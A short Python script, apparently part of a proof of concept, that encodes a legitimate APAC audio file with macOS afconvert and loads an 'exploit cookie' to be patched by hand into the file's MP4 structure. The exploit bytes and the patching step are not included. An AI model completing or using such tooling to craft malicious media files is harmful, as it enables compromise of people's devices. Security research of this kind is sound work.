# create_malicious_mp4.py
import subprocess
from pathlib import Path

def create_malicious_apac_file():
    # First, create a legitimate APAC file using afconvert (macOS only)
    try:
        cmd = [
            "afconvert", 
            "data/test_audio.wav", 
            "-o", "data/legitimate.m4a", 
            "-d", "apac", 
            "-f", "mp4f"
        ]
        subprocess.run(cmd, check=True)
        print("Created legitimate APAC file")
    except:
        print("afconvert not available - need macOS for APAC encoding")
        return None
    
    # Then manually patch the magic cookie
    with open("data/exploit_cookie.dat", "rb") as f:
        malicious_cookie = f.read()
    
    print(f"Ready to patch with {len(malicious_cookie)} byte malicious cookie")
    print("Manual patching required to replace APAC cookie in MP4 atom structure")

if __name__ == "__main__":
    create_malicious_apac_file()